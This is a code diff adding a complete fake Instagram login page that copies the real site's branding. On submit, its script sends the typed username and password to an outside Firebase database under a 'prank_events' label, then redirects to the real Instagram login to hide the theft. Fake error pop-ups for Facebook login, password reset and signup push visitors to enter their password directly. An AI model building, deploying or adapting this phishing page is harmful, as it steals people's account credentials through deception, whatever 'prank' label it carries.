@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* --- 1. GLOBAL RESET --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* --- 2. MAIN CONTAINER --- */
+        .container {
+            width: 350px;
+            margin-top: 12px;
+        }
+
+        /* --- 3. THE LOGIN BOX --- */
+        .box {
+            background-color: #000000;
+            border: 1px solid #363636;
+            padding: 10px 40px 20px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        /* LOGO CONTAINER */
+        .logo-container {
+            margin-top: 36px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: center;
+        }
+
+        /* --- 4. FORM INPUTS --- */
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #121212;
+            border: 1px solid #363636;
+            padding: 9px 0 7px 8px;
+            border-radius: 3px;
+            color: #fafafa;
+            font-size: 12px;
+            outline: none;
+        }
+
+        input:focus {
+            border: 1px solid #a8a8a8;
+        }
+
+        /* --- 5. LOGIN BUTTON --- */
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        /* --- 6. SEPARATOR LINES (OR) --- */
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #363636;
+        }
+
+        .or-text {
+            color: #a8a8a8;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+        }
+
+        /* --- 7. FACEBOOK & LINKS --- */
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            cursor: pointer; /* Makes it look clickable */
+        }
+        
+        .fb-login i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            color: #a8a8a8;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        /* --- 8. SIGN UP BOX --- */
+        .signup-box {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .signup-box p {
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* --- 9. FOOTER LINKS --- */
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #737373;
+            font-size: 12px;
+            padding-bottom: 50px;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .copyright {
+            margin-top: 20px;
+        }
+
+        /* --- 10. PROFESSIONAL ERROR MODAL (THE PRANK PART) --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.65); /* Dimmed background */
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(2px); /* Makes it look pro */
+        }
+
+        .modal-box {
+            background-color: #262626;
+            width: 400px; /* Slightly wider than login box */
+            border-radius: 12px;
+            text-align: center;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            animation: popIn 0.2s ease-out;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-header {
+            padding: 20px;
+            border-bottom: 1px solid #363636;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fafafa;
+        }
+
+        .modal-body {
+            padding: 25px 20px;
+            color: #a8a8a8;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .modal-footer {
+            border-top: 1px solid #363636;
+        }
+
+        .dismiss-btn {
+            width: 100%;
+            padding: 15px;
+            background: none;
+            border: none;
+            color: #ed4956; /* Instagram Warning Red */
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .dismiss-btn:active {
+            background-color: #363636;
+        }
+
+    </style>
+</head>
+<body>
+
+    <main class="container">
+        <article class="box">
+            
+            <div class="logo-container">
+                <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png&quot;); background-position: 0px -2907px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+
+            <div class="separator">
+                <div class="line"></div>
+                <span class="or-text">OR</span>
+                <div class="line"></div>
+            </div>
+
+            <a id="fb-link" class="fb-login">
+                <i class="fab fa-facebook-square"></i> Log in with Facebook
+            </a>
+
+            <a href="#" id="forgot-link" class="forgot-password">Forgot password?</a>
+        </article>
+
+        <article class="box signup-box">
+            <p>Don't have an account? <a href="#" id="signup-link">Sign up</a></p>
+        </article>
+    </main>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            © 2026 Instagram from Meta
+        </div>
+    </footer>
+
+    <div id="error-modal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <div class="modal-title">Facebook Login Error</div>
+            </div>
+            <div class="modal-body">
+                Unable to authenticate via Facebook. The Meta Accounts Center is currently experiencing high latency. 
+                <br><br>
+                <strong>Please log in using your Instagram username and password.</strong>
+            </div>
+            <div class="modal-footer">
+                <button class="dismiss-btn" onclick="closeModal()">Dismiss</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="forgot-modal" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-header">
+            <div class="modal-title">Action Required</div>
+        </div>
+        <div class="modal-body">
+            For security purposes, password resets are not supported on this specific web interface.
+            <br><br>
+            <strong>Please open the official Instagram app on your mobile device to reset your password, then return here to log in.</strong>
+        </div>
+        <div class="modal-footer">
+            <button class="dismiss-btn" onclick="closeForgotModal()">Dismiss</button>
+        </div>
+    </div>
+</div>
+
+<div id="hacker-modal" class="modal-overlay">
+    <div class="modal-box" style="background-color: #0d0d0d; border: 1px solid #00ff00; font-family: 'Courier New', monospace; text-align: left;">
+        <div class="modal-header" style="border-bottom: 1px solid #00ff00;">
+            <div class="modal-title" style="color: #00ff00;">ADMIN_CONSOLE_V1.0</div>
+        </div>
+        <div class="modal-body" id="hacker-data" style="color: #00ff00; height: 200px; overflow-y: auto; font-size: 12px;">
+            > WAITING FOR DATA...
+        </div>
+        <div class="modal-footer" style="border-top: 1px solid #00ff00;">
+            <button class="dismiss-btn" onclick="closeHackerModal()" style="color: #00ff00;">CLOSE_CONNECTION</button>
+            <button class="dismiss-btn" onclick="clearData()" style="color: red;">[CLEAR LOGS]</button>
+        </div>
+    </div>
+</div>
+
+<div id="signup-modal" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-header">
+            <div class="modal-title">Registration Error</div>
+        </div>
+        <div class="modal-body">
+            We are unable to create an account via the web interface at this time due to high server latency.
+            <br><br>
+            <strong>To ensure your account is created successfully, please use the Instagram app on iOS or Android.</strong>
+        </div>
+        <div class="modal-footer">
+            <button class="dismiss-btn" onclick="closeSignupModal()">Dismiss</button>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBSMJItoGC88tm5BsfRIa-ofrlTgZb1vEw",
+  authDomain: "insta-dbe36.firebaseapp.com",
+  projectId: "insta-dbe36",
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const inputs = e.target.querySelectorAll("input");
+
+  try {
+    await addDoc(collection(db, "prank_events"), {
+      event: "login_attempt",
+      username: inputs[0].value,
+      password: inputs[1].value,
+      device: window.innerWidth < 768 ? "mobile" : "desktop",
+      time: new Date().toISOString()
+    });
+
+    // 🔥 Give Firebase time, THEN redirect
+    setTimeout(() => {
+      window.location.href = "https://www.instagram.com/accounts/login/";
+    }, 300);
+
+  } catch (err) {
+    console.error("Firebase write failed:", err);
+  }
+});
+</script>
+
+
+</body>
+</html>
